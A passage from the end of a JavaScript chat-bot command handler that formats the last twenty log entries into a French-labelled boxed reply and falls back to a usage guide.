          const lines = logs.split("\n").slice(-20);
          const cleanLogs = lines.map(line => {
            const match = line.match(/\[(.*?)\] (.*?) → (.*)/);
            if (match) return `• ${match[2]} : ${match[3]}`;
            return `• ${line}`;
          }).join("\n");
          
          return message.reply(`${BOX}\n📜 CHRONIQUES DU CONSEIL 📜\n\n${cleanLogs}\n${BOX}`);
        } catch {
          return message.reply(`${BOX}\nAucun log disponible.\n${BOX}`);
        }
      }

      default:
        return message.reply(this.config.guide);
    }
  }
};